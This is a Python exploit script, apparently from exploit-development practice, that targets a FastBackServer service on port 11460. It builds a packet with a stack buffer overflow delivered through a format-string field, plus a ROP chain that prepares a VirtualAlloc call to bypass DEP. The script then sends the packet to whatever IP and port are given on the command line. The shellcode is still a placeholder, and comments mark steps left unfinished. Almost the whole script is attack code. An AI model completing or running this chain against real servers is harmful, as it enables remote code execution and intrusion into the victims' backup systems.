#!/usr/bin/python

import socket
import sys
from struct import pack

# FastBackServer port 11460 input structure
# 0x00 - 0x04: Checksum DWORD (length of whole buffer minus this DWORD)
# 0x04 - 0x34: psAgentCommand
# |-- 0x04 - 0x10: ??
# |-- 0x10 - 0x14: Opcode
# |-- 0x14 - 0x18: 1st copy offset
# |-- 0x18 - 0x1c: 1st copy size
# |-- 0x1c - 0x20: 2nd copy offset
# |-- 0x20 - 0x24: 2nd copy size
# |-- 0x24 - 0x28: 3rd copy offset
# |-- 0x28 - 0x2c: 3rd copy size
# |-- 0x2c - 0x34: ??
# 0x34 -  End: psCommandBuffer (sub-buffer sizes specified by previous values)
# |-- 0x34 - 0xNN: 1st buffer
# |-- 0xNN - 0xMM: 2nd buffer
# |-- 0xMM - 0xLL: 3rd buffer

# psAgentCommand
buf= bytearray([0x41]*0x0C) # ??
buf += pack('<i', 0x0534) # Opcode
buf += pack('<i', 0x0) # offset 1
buf += pack('<i', 0x500) # size 1
buf += pack('<i', 0x0) # offset 2
buf += pack('<i', 0x100) # size 2
buf += pack('<i', 0x0) # offset 3
buf += pack('<i', 0x100) # size 3
buf += bytearray([0x41]*0x8) # ??

# bad_chars = \x00 \x09 \x0a \x0b \x0c \x0d \x20

# psCommandBuffer
# va = skeleton VirtualAlloc call
va  = pack('<L', 0x56697274) # address of VirtualAlloc
va += pack('<L', 0x7368656c) # address of shellcode
va += pack('<L', 0x7368656c) # lpAddress placeholder
va += pack('<L', 0x42424242) # dwSize placeholder
va += pack('<L', 0x43434343) # flAllocationType placeholder
# pre eip overflow offset (IS INPUT BEFORE va)
va += pack('<L', 0x45454545) # flProtect placeholder
offset = bytearray([0x50]*(276 - len(va))) 
# START ROP: eip control starts here, save current esp to a new register (esi)
eip  = pack('<L', 0x50501110) # push esp; push eax; pop edi; pop esi; ret
# subtract 0x1c from esi (distance of esp to VirtualAlloc placeholder address)
rop  = pack('<L', 0x5050118e) # mov eax, esi; pop esi; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xffffffe4) # -0x1c
rop += pack('<L', 0x5051579a) # add eax, ecx; ret
rop += pack('<L', 0x5052f773) # push eax ; pop esi; ret
# dereference VirtualAlloc IAT pointer and replace placeholder value
rop += pack('<L', 0x5053a0f5) # pop eax ; ret
rop += pack('<L', 0x5054a221) # IAT VirtualAlloc pointer + 1 (to avoid bad char)
rop += pack('<L', 0x505410f4) # dec eax; pop ebp; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack('<L', 0x5051f278) # mov eax, [eax]; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax; ret
# increment esi down to shellcode placeholder address, replace with shellcode address
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5050118e) # mov eax, esi ; pop esi ; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack("<L", 0x5052f773) # push eax ; pop esi ; ret
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xfffffdf0) # 0x210, placeholder offset to end of rop for shellcode start
rop += pack('<L', 0x50533bf4) # sub eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
# increment esi to lpAddress, replace with shellcode address
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5050118e) # mov eax, esi ; pop esi ; ret
rop += pack('<L', 0x41414141) # junk value
rop += pack("<L", 0x5052f773) # push eax ; pop esi ; ret
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0xfffffdf4) # 0x20c, placeholder offset to end of rop for shellcode start
rop += pack('<L', 0x50533bf4) # sub eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
# increment esi to dwSize, replace with 0x01
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5051680a) # pop eax ; ret
rop += pack('<L', 0xffffffff) # -0x01
rop += pack('<L', 0x5051d0ec) # neg eax ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
# increment esi to flAllocationType, replace with 0x1000
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5051680a) # pop eax ; ret
rop += pack('<L', 0x80808080) # 80808080 + 7f7f8f80 = 1000
rop += pack('<L', 0x505115a3) # pop ecx ; ret
rop += pack('<L', 0x7f7f8f80) # 80808080 + 7f7f8f80 = 1000
rop += pack('<L', 0x5051579a) # add eax, ecx ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
# increment esi to flProtect, replace with 0x40
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x50522fa7) # inc esi ; add al, 0x2b ; ret
rop += pack('<L', 0x5051680a) # pop eax ; ret
rop += pack('<L', 0xffffffc0) # -0x40
rop += pack('<L', 0x5051d0ec) # neg eax ; ret
rop += pack('<L', 0x5051cbb6) # mov [esi], eax ; ret
# return into VirtualAlloc Skeleton by changing esp to its address
#
#
# NOW WITH REAL END OF ROP, CHANGE SHELLCODE ADDRESS ABOVE


rop += bytearray([0x70]*200) # extra space available for rop chaining
# format string of first buffer, expected input with overflow parameter
buf += b'File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d' %(offset+va+eip+rop,0,0,0,0)
# Checksum + buf (psAgentCommand and psCommandBuffer)
buf = pack('>i', len(buf)-4) + buf
# buf += bytearray([0x61]*0x100) # buffer 1
# buf += bytearray([0x62]*0x200) # buffer 2
# buf += bytearray([0x63]*0x300) # buffer 3

def main():
    if len(sys.argv) != 3:
        print("Usage: %s <ip_address> <port>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
        
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))

    s.send(buf)
    s.close()

    print("[+] Packet sent")
    sys.exit(0)

if __name__ == "__main__":
    main()
